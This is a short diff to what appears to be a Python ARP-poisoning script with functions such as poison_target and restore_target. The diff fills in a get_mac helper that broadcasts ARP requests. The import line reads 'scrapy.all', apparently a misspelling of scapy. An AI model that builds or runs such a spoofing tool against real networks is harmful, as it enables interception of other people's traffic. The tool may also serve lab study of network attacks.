@@ -4,7 +4,7 @@ import os
 import sys
 import threading
 import signal
-from scrapy.all import conf, sniff, wrpcap, ARP, send
+from scrapy.all import conf, sniff, wrpcap, ARP, send, srp, Ether
 
 
 interface = 'en0'
@@ -32,7 +32,11 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
 
 def get_mac(ip_address):
-    pass
+    responses, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_address),
+                                timeout=2, retry=10)
+    for s, r in responses:
+        return r[Ether].src
+    return None
 
 
 def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
